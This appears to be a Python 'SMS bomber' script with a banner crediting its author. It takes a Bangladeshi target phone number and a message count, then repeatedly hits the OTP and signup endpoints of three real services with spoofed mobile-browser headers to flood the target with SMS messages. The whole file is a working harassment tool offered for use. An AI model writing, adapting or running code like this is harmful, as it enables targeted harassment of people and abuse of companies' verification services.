import requests,os
os.system("clear")


logo =                                          """ 

\033[1;37m╔═════════════════════════════════════════════╗
\033[1;37m║      \033[1;36m╔╗╔╔═╗╦ ╦╔═╗╦    ╔═╗╦ ╦╔╦╗╔═╗╔╦╗       \033[1;37m║
\033[1;37m║      \033[0m║║║║╣ ╠═╣╠═╣║    ╠═╣╠═╣║║║║╣  ║║       \033[1;37m║
\033[1;37m║      \033[1;36m╝╚╝╚═╝╩ ╩╩ ╩╩═╝  ╩ ╩╩ ╩╩ ╩╚═╝═╩╝       \033[1;37m║
\033[1;37m╠═════════════════════════════════════════════╣
\033[1;37m║    \033[1;36m[\033[1;37m✔\033[1;36m] \033[1;33mAUTHOR   :   NEHAL AHMED             \033[1;37m║
\033[1;37m║    \033[1;36m[\033[1;37m✔\033[1;36m] \033[1;35mGITHUB   :   weirdnehal              \033[1;37m║
\033[1;37m║    \033[1;36m[\033[1;37m✔\033[1;36m] \033[1;34mWHATSAPP :   +8801613016943          \033[1;37m║
\033[1;37m║    \033[1;36m[\033[1;37m!\033[1;36m] \033[1;31mHave fun in cyberspace and meat space\033[1;37m║
\033[1;37m╚═════════════════════════════════════════════╝


""" 


print(logo)
follow=input("[+] FIRST FOLLOW MY PAGE : ")

os.system("xdg-open https://www.facebook.com/nehal.ahmed6")
name=input("[!] TYPE MY PAGE NAME : ")

num=input("\n \033[1;31m[*]Enter Target (Without +880):")
ammo=int(input("\n \033[1;31m[*]Enter Amount (Default: 10):"))
print("\n\n \033[1;32mMessage Sending Start.....")
#print("WAIT AND SEE")

headers1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"/",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
headers2={
         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
data={
  "name": num,
  "phoneNumber": num,
  "service": "redx"
}
headers3={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
count=0
while ammo>count:
  send1=requests.get(url1,headers=headers1)
  if send1.status_code==200:
    count+=1
    print(f"{count} SMS Successfully Done!")
  else:
    pass
  send2=requests.get(url2,headers=headers2)
  if send2.status_code==200:
    count+=1
    print(f"{count} SMS Successfully Done!")
  else:
    pass
  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send3.status_code==200:
    count+=1
    print(f"{count} SMS Successfully Done!")
  else:
    pass
print("\033[1;31m[✔] Thanks For Using Our Tool [✔]")